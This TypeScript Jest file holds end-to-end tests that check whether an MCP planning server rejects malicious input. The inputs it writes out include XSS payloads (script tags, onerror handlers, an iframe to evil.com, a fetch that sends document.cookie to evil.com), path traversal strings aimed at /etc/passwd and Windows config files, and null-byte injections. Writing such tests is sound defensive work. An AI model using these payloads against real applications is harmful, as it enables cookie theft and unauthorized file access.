import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';
import { createMcpServer, createServices } from '../../src/server/index.js';
import * as fs from 'fs/promises';
import * as path from 'path';
import * as crypto from 'crypto';

/**
 * RED PHASE - REQ-3: Input Sanitization Security Fixes
 *
 * E2E tests for 4 CRITICAL security vulnerabilities:
 * - BUG-003: XSS vulnerability - HTML/JavaScript accepted without sanitization
 * - BUG-029: Null bytes in text fields - potential injection attacks
 * - BUG-030: Path traversal in artifact targets - file system security
 * - BUG-032: Null bytes in tag keys - tag lookup/matching issues
 *
 * These tests should FAIL initially (RED), then PASS after GREEN phase fixes.
 */

// Helper to retry directory removal on Windows
async function removeDirectoryWithRetry(dir: string, maxRetries = 3): Promise<void> {
  for (let i = 0; i < maxRetries; i++) {
    try {
      await fs.rm(dir, { recursive: true, force: true });
      return;
    } catch (error: unknown) {
      if (i === maxRetries - 1) throw error;
      await new Promise((resolve) => setTimeout(resolve, 100 * (i + 1)));
    }
  }
}

// Helper to parse MCP tool result
// eslint-disable-next-line @typescript-eslint/no-unnecessary-type-parameters
function parseResult<T>(result: unknown): T {
  const r = result as { content: { type: string; text: string }[] };
  return JSON.parse(r.content[0].text) as T;
}

// Helper to expect error from MCP tool call
async function expectError(
  promise: Promise<unknown>,
  errorPattern: RegExp
): Promise<void> {
  const result = (await promise) as { isError?: boolean; content: { text: string }[] };
  expect(result.isError).toBe(true);
  expect(result.content[0].text).toMatch(errorPattern);
}

describe('E2E: Input Sanitization Security Fixes (GREEN Phase)', () => {
  let client: Client;
  let storagePath: string;
  let cleanup: (() => Promise<void>) | undefined;
  let planId: string;

  beforeAll(async () => {
    storagePath = path.join(
      process.cwd(),
      '.test-temp',
      'input-sanitization-' + String(Date.now()) + '-' + crypto.randomUUID()
    );
    await fs.mkdir(storagePath, { recursive: true });

    const services = await createServices(storagePath);
    const { server } = createMcpServer(services);
    const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();

    client = new Client(
      { name: 'input-sanitization-test', version: '1.0.0' },
      { capabilities: {} }
    );

    await server.connect(serverTransport);
    await client.connect(clientTransport);

    cleanup = async (): Promise<void> => {
      await client.close();
      await server.close();
      await removeDirectoryWithRetry(storagePath);
    };

    // Setup: Create test plan
    const planResult = await client.callTool({
      name: 'plan',
      arguments: {
        action: 'create',
        name: 'Input Sanitization Test Plan',
        description: 'Testing security vulnerability fixes',
      },
    });
    const plan = parseResult<{ planId: string }>(planResult);
    planId = plan.planId;
  });

  afterAll(async () => {
    if (cleanup !== undefined) {
      await cleanup();
    }
  });

  describe('BUG-003: XSS Vulnerability - HTML/JavaScript Injection', () => {
    it('should reject script tags in requirement title', async () => {
      await expectError(
        client.callTool({
          name: 'requirement',
          arguments: {
            action: 'add',
            planId,
            requirement: {
              title: '<script>alert("XSS")</script>',
              description: 'Test requirement',
              category: 'functional',
              priority: 'high',
              source: { type: 'user-request' },
            },
          },
        }),
        /HTML tags/i
      );
    });

    it('should reject script tags in requirement description', async () => {
      await expectError(
        client.callTool({
          name: 'requirement',
          arguments: {
            action: 'add',
            planId,
            requirement: {
              title: 'Valid title',
              description: '<script>alert("XSS")</script>',
              category: 'functional',
              priority: 'high',
              source: { type: 'user-request' },
            },
          },
        }),
        /HTML tags/i
      );
    });

    it('should reject HTML img tags with onerror in solution title', async () => {
      await expectError(
        client.callTool({
          name: 'solution',
          arguments: {
            action: 'propose',
            planId,
            solution: {
              title: '<img src=x onerror="alert(1)">',
              description: 'Valid description',
              approach: 'Test approach',
              addressing: [],
            },
          },
        }),
        /HTML tags/i
      );
    });

    it('should reject HTML div tags in decision question', async () => {
      await expectError(
        client.callTool({
          name: 'decision',
          arguments: {
            action: 'record',
            planId,
            decision: {
              title: 'Valid title',
              question: '<div onclick="alert(1)">Click me</div>',
              decision: 'Test decision',
              context: 'Test context',
            },
          },
        }),
        /HTML tags/i
      );
    });

    it('should reject script tags in phase title', async () => {
      await expectError(
        client.callTool({
          name: 'phase',
          arguments: {
            action: 'add',
            planId,
            phase: {
              title: '<script>document.cookie</script>',
              description: 'Valid description',
            },
          },
        }),
        /HTML tags/i
      );
    });

    it('should reject HTML anchor tags in artifact description', async () => {
      await expectError(
        client.callTool({
          name: 'artifact',
          arguments: {
            action: 'add',
            planId,
            artifact: {
              title: 'Valid title',
              description: '<a href="javascript:alert(1)">Click</a>',
              artifactType: 'code',
            },
          },
        }),
        /HTML tags/i
      );
    });

    it('should reject iframe tags in plan name', async () => {
      await expectError(
        client.callTool({
          name: 'plan',
          arguments: {
            action: 'create',
            name: '<iframe src="evil.com"></iframe>',
            description: 'Valid description',
          },
        }),
        /HTML tags/i
      );
    });
  });

  describe('BUG-029: Null Bytes in Text Fields', () => {
    it('should reject null bytes in requirement title', async () => {
      await expectError(
        client.callTool({
          name: 'requirement',
          arguments: {
            action: 'add',
            planId,
            requirement: {
              title: 'Test with null byte\u0000inside',
              description: 'Valid description',
              category: 'functional',
              priority: 'high',
              source: { type: 'user-request' },
            },
          },
        }),
        /null byte/i
      );
    });

    it('should reject null bytes in requirement description', async () => {
      await expectError(
        client.callTool({
          name: 'requirement',
          arguments: {
            action: 'add',
            planId,
            requirement: {
              title: 'Valid title',
              description: 'Description with null\u0000byte',
              category: 'functional',
              priority: 'high',
              source: { type: 'user-request' },
            },
          },
        }),
        /null byte/i
      );
    });

    it('should reject null bytes in solution approach', async () => {
      await expectError(
        client.callTool({
          name: 'solution',
          arguments: {
            action: 'propose',
            planId,
            solution: {
              title: 'Valid title',
              description: 'Valid description',
              approach: 'Approach with\u0000null byte',
              addressing: [],
            },
          },
        }),
        /null byte/i
      );
    });

    it('should reject null bytes in decision context', async () => {
      await expectError(
        client.callTool({
          name: 'decision',
          arguments: {
            action: 'record',
            planId,
            decision: {
              title: 'Valid title',
              question: 'Valid question',
              decision: 'Valid decision',
              context: 'Context\u0000with null byte',
            },
          },
        }),
        /null byte/i
      );
    });

    it('should reject null bytes in phase implementation notes', async () => {
      // First create a phase
      const phaseResult = await client.callTool({
        name: 'phase',
        arguments: {
          action: 'add',
          planId,
          phase: {
            title: 'Valid phase',
            description: 'Valid description',
          },
        },
      });
      const phase = parseResult<{ phaseId: string }>(phaseResult);

      await expectError(
        client.callTool({
          name: 'phase',
          arguments: {
            action: 'update',
            planId,
            phaseId: phase.phaseId,
            updates: {
              implementationNotes: 'Notes with\u0000null byte',
            },
          },
        }),
        /null byte/i
      );
    });

    it('should reject null bytes at start of string', async () => {
      await expectError(
        client.callTool({
          name: 'requirement',
          arguments: {
            action: 'add',
            planId,
            requirement: {
              title: '\u0000Starts with null',
              description: 'Valid description',
              category: 'functional',
              priority: 'high',
              source: { type: 'user-request' },
            },
          },
        }),
        /null byte/i
      );
    });

    it('should reject null bytes at end of string', async () => {
      await expectError(
        client.callTool({
          name: 'requirement',
          arguments: {
            action: 'add',
            planId,
            requirement: {
              title: 'Ends with null\u0000',
              description: 'Valid description',
              category: 'functional',
              priority: 'high',
              source: { type: 'user-request' },
            },
          },
        }),
        /null byte/i
      );
    });
  });

  describe('BUG-030: Path Traversal in Artifact Targets', () => {
    it('should reject path traversal with ../ in artifact target', async () => {
      await expectError(
        client.callTool({
          name: 'artifact',
          arguments: {
            action: 'add',
            planId,
            artifact: {
              title: 'Test Artifact',
              artifactType: 'code',
              targets: [
                {
                  path: '../../../etc/passwd',
                  action: 'modify',
                },
              ],
            },
          },
        }),
        /path traversal/i
      );
    });

    it('should reject path traversal with ..\\ (Windows) in artifact target', async () => {
      await expectError(
        client.callTool({
          name: 'artifact',
          arguments: {
            action: 'add',
            planId,
            artifact: {
              title: 'Test Artifact',
              artifactType: 'code',
              targets: [
                {
                  path: '..\\..\\..\\windows\\system32\\config',
                  action: 'modify',
                },
              ],
            },
          },
        }),
        /path traversal/i
      );
    });

    it('should reject path traversal in middle of path', async () => {
      await expectError(
        client.callTool({
          name: 'artifact',
          arguments: {
            action: 'add',
            planId,
            artifact: {
              title: 'Test Artifact',
              artifactType: 'code',
              targets: [
                {
                  path: 'src/../../../etc/passwd',
                  action: 'modify',
                },
              ],
            },
          },
        }),
        /path traversal/i
      );
    });

    it('should reject absolute path on Unix (starts with /)', async () => {
      await expectError(
        client.callTool({
          name: 'artifact',
          arguments: {
            action: 'add',
            planId,
            artifact: {
              title: 'Test Artifact',
              artifactType: 'code',
              targets: [
                {
                  path: '/etc/passwd',
                  action: 'modify',
                },
              ],
            },
          },
        }),
        /relative path/i
      );
    });

    it('should reject absolute path on Windows (C:)', async () => {
      await expectError(
        client.callTool({
          name: 'artifact',
          arguments: {
            action: 'add',
            planId,
            artifact: {
              title: 'Test Artifact',
              artifactType: 'code',
              targets: [
                {
                  path: 'C:\\Windows\\System32\\config',
                  action: 'modify',
                },
              ],
            },
          },
        }),
        /relative path/i
      );
    });

    it('should reject path traversal in artifact update', async () => {
      // First create artifact with valid path
      const artifactResult = await client.callTool({
        name: 'artifact',
        arguments: {
          action: 'add',
          planId,
          artifact: {
            title: 'Valid Artifact',
            artifactType: 'code',
            targets: [{ path: 'src/file.ts', action: 'create' }],
          },
        },
      });
      const artifact = parseResult<{ artifactId: string }>(artifactResult);

      // Try to update with malicious path
      await expectError(
        client.callTool({
          name: 'artifact',
          arguments: {
            action: 'update',
            planId,
            artifactId: artifact.artifactId,
            updates: {
              targets: [{ path: '../../../etc/passwd', action: 'modify' }],
            },
          },
        }),
        /path traversal/i
      );
    });

    it('should reject multiple path traversal patterns', async () => {
      await expectError(
        client.callTool({
          name: 'artifact',
          arguments: {
            action: 'add',
            planId,
            artifact: {
              title: 'Test Artifact',
              artifactType: 'code',
              targets: [
                {
                  path: '../../folder/../../../secret.txt',
                  action: 'modify',
                },
              ],
            },
          },
        }),
        /path traversal/i
      );
    });
  });

  describe('BUG-032: Null Bytes in Tag Keys', () => {
    it('should reject null bytes in requirement tag key', async () => {
      await expectError(
        client.callTool({
          name: 'requirement',
          arguments: {
            action: 'add',
            planId,
            requirement: {
              title: 'Valid title',
              description: 'Valid description',
              category: 'functional',
              priority: 'high',
              source: { type: 'user-request' },
              tags: [{ key: 'key\u0000null', value: 'value' }],
            },
          },
        }),
        /null byte/i
      );
    });

    it('should reject null bytes in solution tag key', async () => {
      await expectError(
        client.callTool({
          name: 'solution',
          arguments: {
            action: 'propose',
            planId,
            solution: {
              title: 'Valid title',
              description: 'Valid description',
              approach: 'Test approach',
              addressing: [],
              tags: [{ key: 'tag\u0000key', value: 'value' }],
            },
          },
        }),
        /null byte/i
      );
    });

    it('should reject null bytes in decision tag key', async () => {
      await expectError(
        client.callTool({
          name: 'decision',
          arguments: {
            action: 'record',
            planId,
            decision: {
              title: 'Valid title',
              question: 'Valid question',
              decision: 'Valid decision',
              context: 'Valid context',
              tags: [{ key: 'decision\u0000tag', value: 'value' }],
            },
          },
        }),
        /null byte/i
      );
    });

    it('should reject null bytes in phase tag key', async () => {
      await expectError(
        client.callTool({
          name: 'phase',
          arguments: {
            action: 'add',
            planId,
            phase: {
              title: 'Valid title',
              description: 'Valid description',
              tags: [{ key: 'phase\u0000tag', value: 'value' }],
            },
          },
        }),
        /null byte/i
      );
    });

    it('should reject null bytes in artifact tag key', async () => {
      await expectError(
        client.callTool({
          name: 'artifact',
          arguments: {
            action: 'add',
            planId,
            artifact: {
              title: 'Valid title',
              artifactType: 'code',
              tags: [{ key: 'artifact\u0000tag', value: 'value' }],
            },
          },
        }),
        /null byte/i
      );
    });

    it('should reject null bytes in tag value', async () => {
      await expectError(
        client.callTool({
          name: 'requirement',
          arguments: {
            action: 'add',
            planId,
            requirement: {
              title: 'Valid title',
              description: 'Valid description',
              category: 'functional',
              priority: 'high',
              source: { type: 'user-request' },
              tags: [{ key: 'validkey', value: 'value\u0000with null' }],
            },
          },
        }),
        /null byte/i
      );
    });

    it('should reject multiple null bytes in tag key', async () => {
      await expectError(
        client.callTool({
          name: 'requirement',
          arguments: {
            action: 'add',
            planId,
            requirement: {
              title: 'Valid title',
              description: 'Valid description',
              category: 'functional',
              priority: 'high',
              source: { type: 'user-request' },
              tags: [{ key: '\u0000multi\u0000null\u0000', value: 'value' }],
            },
          },
        }),
        /null byte/i
      );
    });
  });

  describe('BUG-035: Whitespace-Only Tag Keys (bonus from QA report)', () => {
    it('should reject whitespace-only tag key (spaces)', async () => {
      await expectError(
        client.callTool({
          name: 'requirement',
          arguments: {
            action: 'add',
            planId,
            requirement: {
              title: 'Valid title',
              description: 'Valid description',
              category: 'functional',
              priority: 'high',
              source: { type: 'user-request' },
              tags: [{ key: '   ', value: 'value' }],
            },
          },
        }),
        /whitespace/i
      );
    });

    it('should reject whitespace-only tag key (tabs)', async () => {
      await expectError(
        client.callTool({
          name: 'requirement',
          arguments: {
            action: 'add',
            planId,
            requirement: {
              title: 'Valid title',
              description: 'Valid description',
              category: 'functional',
              priority: 'high',
              source: { type: 'user-request' },
              tags: [{ key: '\t\t\t', value: 'value' }],
            },
          },
        }),
        /whitespace/i
      );
    });

    it('should reject whitespace-only tag key (mixed)', async () => {
      await expectError(
        client.callTool({
          name: 'requirement',
          arguments: {
            action: 'add',
            planId,
            requirement: {
              title: 'Valid title',
              description: 'Valid description',
              category: 'functional',
              priority: 'high',
              source: { type: 'user-request' },
              tags: [{ key: ' \t \n ', value: 'value' }],
            },
          },
        }),
        /whitespace/i
      );
    });
  });

  describe('Control Characters (bonus security test)', () => {
    it('should reject control characters in requirement title', async () => {
      await expectError(
        client.callTool({
          name: 'requirement',
          arguments: {
            action: 'add',
            planId,
            requirement: {
              title: 'Test with\x07bell\x1Bcontrol',
              description: 'Valid description',
              category: 'functional',
              priority: 'high',
              source: { type: 'user-request' },
            },
          },
        }),
        /control character/i
      );
    });

    it('should allow newlines and tabs in description (valid control chars)', async () => {
      const result = await client.callTool({
        name: 'requirement',
        arguments: {
          action: 'add',
          planId,
          requirement: {
            title: 'Valid title',
            description: 'Description with\nnewline and\ttab',
            category: 'functional',
            priority: 'high',
            source: { type: 'user-request' },
          },
        },
      });

      const req = parseResult<{ requirementId: string }>(result);
      expect(req.requirementId).toBeDefined();
    });
  });

  // ============================================================
  // M-1, M-2: Update Operations Must Apply Same Validation as Create
  // ============================================================
  describe('Update Operations Validation Bypass Prevention', () => {
    let testRequirementId: string;
    let testSolutionId: string;
    let testPhaseId: string;
    let testDecisionId: string;

    beforeAll(async () => {
      // Create valid entities first
      const reqResult = await client.callTool({
        name: 'requirement',
        arguments: {
          action: 'add',
          planId,
          requirement: {
            title: 'Update Test Requirement',
            description: 'Valid description',
            category: 'functional',
            priority: 'high',
            source: { type: 'user-request' },
          },
        },
      });
      testRequirementId = parseResult<{ requirementId: string }>(reqResult).requirementId;

      const solResult = await client.callTool({
        name: 'solution',
        arguments: {
          action: 'propose',
          planId,
          solution: {
            title: 'Update Test Solution',
            description: 'Valid solution',
            approach: 'Valid approach',
          },
        },
      });
      testSolutionId = parseResult<{ solutionId: string }>(solResult).solutionId;

      const phaseResult = await client.callTool({
        name: 'phase',
        arguments: {
          action: 'add',
          planId,
          phase: {
            title: 'Update Test Phase',
            description: 'Valid phase',
          },
        },
      });
      testPhaseId = parseResult<{ phaseId: string }>(phaseResult).phaseId;

      const decisionResult = await client.callTool({
        name: 'decision',
        arguments: {
          action: 'record',
          planId,
          decision: {
            title: 'Update Test Decision',
            question: 'What to do?',
            decision: 'Do this',
            context: 'Valid context',
            consequences: 'Valid consequences',
          },
        },
      });
      testDecisionId = parseResult<{ decisionId: string }>(decisionResult).decisionId;
    });

    // M-2: Requirement update must validate description/rationale
    it('should reject XSS in requirement.description via update', async () => {
      await expectError(
        client.callTool({
          name: 'requirement',
          arguments: {
            action: 'update',
            planId,
            requirementId: testRequirementId,
            updates: {
              description: '<script>alert("XSS via update")</script>',
            },
          },
        }),
        /HTML tags/i
      );
    });

    it('should reject XSS in requirement.rationale via update', async () => {
      await expectError(
        client.callTool({
          name: 'requirement',
          arguments: {
            action: 'update',
            planId,
            requirementId: testRequirementId,
            updates: {
              rationale: '<img src=x onerror=alert("XSS")>',
            },
          },
        }),
        /HTML tags/i
      );
    });

    // M-2: Solution update must validate description/approach
    it('should reject XSS in solution.description via update', async () => {
      await expectError(
        client.callTool({
          name: 'solution',
          arguments: {
            action: 'update',
            planId,
            solutionId: testSolutionId,
            updates: {
              description: '<script>malicious()</script>',
            },
          },
        }),
        /HTML tags/i
      );
    });

    it('should reject XSS in solution.approach via update', async () => {
      await expectError(
        client.callTool({
          name: 'solution',
          arguments: {
            action: 'update',
            planId,
            solutionId: testSolutionId,
            updates: {
              approach: '<iframe src="http://evil.com"></iframe>',
            },
          },
        }),
        /HTML tags/i
      );
    });

    // M-2: Phase update already validates implementationNotes (line 544), but need description
    it('should reject XSS in phase.description via update', async () => {
      await expectError(
        client.callTool({
          name: 'phase',
          arguments: {
            action: 'update',
            planId,
            phaseId: testPhaseId,
            updates: {
              description: '<script>document.cookie</script>',
            },
          },
        }),
        /HTML tags/i
      );
    });

    // M-1: Decision update must validate context/consequences
    it('should reject XSS in decision.context via update', async () => {
      await expectError(
        client.callTool({
          name: 'decision',
          arguments: {
            action: 'update',
            planId,
            decisionId: testDecisionId,
            updates: {
              context: '<script>stealCredentials()</script>',
            },
          },
        }),
        /HTML tags/i
      );
    });

    it('should reject XSS in decision.consequences via update', async () => {
      await expectError(
        client.callTool({
          name: 'decision',
          arguments: {
            action: 'update',
            planId,
            decisionId: testDecisionId,
            updates: {
              consequences: '<img onerror="fetch(\'http://evil.com/?\'+document.cookie)" src=x>',
            },
          },
        }),
        /HTML tags/i
      );
    });

    // Null byte injection via update
    it('should reject null bytes in requirement.description via update', async () => {
      await expectError(
        client.callTool({
          name: 'requirement',
          arguments: {
            action: 'update',
            planId,
            requirementId: testRequirementId,
            updates: {
              description: 'Valid start\x00hidden payload',
            },
          },
        }),
        /null bytes/i
      );
    });

    it('should reject null bytes in decision.context via update', async () => {
      await expectError(
        client.callTool({
          name: 'decision',
          arguments: {
            action: 'update',
            planId,
            decisionId: testDecisionId,
            updates: {
              context: 'Context\x00with null byte',
            },
          },
        }),
        /null bytes/i
      );
    });
  });
});
